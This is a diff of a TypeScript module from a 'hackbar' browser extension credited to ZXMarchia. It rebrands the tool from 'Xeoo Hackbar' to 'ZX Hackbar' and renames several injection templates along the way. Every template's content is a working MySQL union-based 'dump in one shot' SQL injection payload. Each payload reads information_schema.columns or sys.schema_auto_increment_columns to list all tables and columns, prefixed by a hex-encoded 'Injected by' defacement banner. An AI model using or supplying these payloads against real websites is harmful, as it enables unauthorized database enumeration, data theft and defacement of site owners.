@@ -1,5 +1,5 @@
 /**
- * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
+ * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
  * 
  * @module UnionBasedDiosMysql
  * @author Zone Xploiter / ZXMarchia
@@ -321,38 +321,38 @@ const variableBasedDiosTemplates: BuilderTemplate[] = [
 // 4. CLASSIC & SIGNATURES (AUTHOR / POPULAR PAYLOADS) — 15 Templates
 // ============================================================================
 const classicSignaturesDiosTemplates: BuilderTemplate[] = [
-  // --- ZXMarchia & Xeoo Hackbar Signatures ---
+  // --- ZXMarchia & ZX Hackbar Signatures ---
   {
     id: 'dios-mysql-sig-zxmarchia-neon',
-    name: 'Injected by ZXMarchia - Xeoo Hackbar (Neon Green Glow)',
+    name: 'Injected by ZXMarchia - ZX Hackbar (Neon Green Glow)',
     group: 'Classic & Signatures',
     tags: ['signature', 'zxmarchia', 'neon-green', 'watermark'],
-    description: 'Header tebal menyala hijau neon <font color=#A3FF70><b>[ Injected by ZXMarchia - Xeoo Hackbar ]</b></font><br>',
-    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    description: 'Header tebal menyala hijau neon <font color=#A3FF70><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
+    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'dios-mysql-sig-zxmarchia-red',
-    name: 'Injected by ZXMarchia - Xeoo Hackbar (Neon Red Fire)',
+    name: 'Injected by ZXMarchia - ZX Hackbar (Neon Red Fire)',
     group: 'Classic & Signatures',
     tags: ['signature', 'zxmarchia', 'neon-red', 'watermark'],
-    description: 'Header tebal merah menyala <font color=#FF3344><b>[ Injected by ZXMarchia - Xeoo Hackbar ]</b></font><br>',
-    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    description: 'Header tebal merah menyala <font color=#FF3344><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
+    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'dios-mysql-sig-zxmarchia-cyan',
-    name: 'Injected by ZXMarchia - Xeoo Hackbar (Cyber Cyan)',
+    name: 'Injected by ZXMarchia - ZX Hackbar (Cyber Cyan)',
     group: 'Classic & Signatures',
     tags: ['signature', 'zxmarchia', 'cyber-cyan', 'watermark'],
-    description: 'Header tebal biru elektrik <font color=#00FFFF><b>[ Injected by ZXMarchia - Xeoo Hackbar ]</b></font><br>',
-    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    description: 'Header tebal biru elektrik <font color=#00FFFF><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
+    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'dios-mysql-sig-zxmarchia-ascii',
-    name: 'Injected by ZXMarchia - Xeoo Hackbar (ASCII Frame)',
+    name: 'Injected by ZXMarchia - ZX Hackbar (ASCII Frame)',
     group: 'Classic & Signatures',
     tags: ['signature', 'zxmarchia', 'ascii-frame', 'watermark'],
-    description: 'Header border simbol ASCII: === [ Injected by ZXMarchia - Xeoo Hackbar ] ===',
-    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d203d3d3d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    description: 'Header border simbol ASCII: === [ Injected by ZXMarchia - ZX Hackbar ] ===',
+    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d203d3d3d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'dios-mysql-sig-zxmarchia-noninfo',
@@ -360,7 +360,7 @@ const classicSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic & Signatures',
     tags: ['signature', 'zxmarchia', 'non-info', 'sys-bypass'],
     description: 'Header ZXMarchia dengan bypass tabel sistem sys.schema_auto_increment_columns',
-    content: "(SELECT(@n)FROM(SELECT(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(sys.schema_auto_increment_columns)WHERE(table_schema=database())AND(@n)AND(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
+    content: "(SELECT(@n)FROM(SELECT(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(sys.schema_auto_increment_columns)WHERE(table_schema=database())AND(@n)AND(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
   },
 
   // --- Classic Community Signatures ---
